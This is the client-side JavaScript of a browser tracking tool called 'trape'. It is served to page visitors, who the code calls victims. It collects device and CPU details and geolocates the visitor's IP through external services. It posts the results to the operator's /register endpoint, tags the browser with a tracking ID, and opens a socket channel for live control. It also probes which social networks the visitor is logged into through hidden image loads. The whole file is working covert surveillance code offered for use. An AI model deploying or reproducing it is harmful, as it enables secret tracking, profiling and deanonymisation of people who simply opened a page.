$(document).ready(function($) {

if (typeof(io) != 'undefined') {
        namespace = '/trape';
        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);
    }

    $.getJSON('//ip-api.com/json', function(data) {
        var d = getVictimData();

        $.extend( true, d, data);

        var obj_parser = new UAParser();

        d.cpu = JSON.stringify(obj_parser.getCPU())
            .replace(/"/gi, '')
            .replace(/{/gi, '')
            .replace(/}/gi, '')
            .replace(/:/gi, ' : ') + ' - ' + (navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Cores' : '');
        
    	$.ajax({
            url: '/register',
            data: d,
            dataType: "json",
            type: 'POST',
            success: function(response) {
                if (response.status == 'OK'){
                    localStorage.setItem("trape_vId", response.vId);
                    if (socket != undefined) {
                        socket.emit('join', {room: response.vId});
                        defineSockets(socket);
                    }
                }
            },
            error: function(error) {}
        });
    
    });

    $.getJSON('//freegeoip.net/json/?callback=?', function(data) {
        var dInfo = {ip : null, vId : null, red : null};
        $.extend( true, dInfo, data);
        dInfo.vId = localStorage.trape_vId
        var idx = 0;

        $.each(Services, function(index, network) {
            var img = document.createElement("img");
            img.src = network.url + network.path;
            img.onload = function() {
                dInfo.red = network.name;
                sendData(dInfo);
                idx = getUpdateData(idx);
            };
                img.onerror = function() {
                idx = getUpdateData(idx);
            };
        });
    });

    var getUpdateData = function(idx) {
        idx++;
        if (idx >= Services.length) {
            socket.emit('my_broadcast_event', {data: 'update-data'});
        }
        return idx;
    }
});


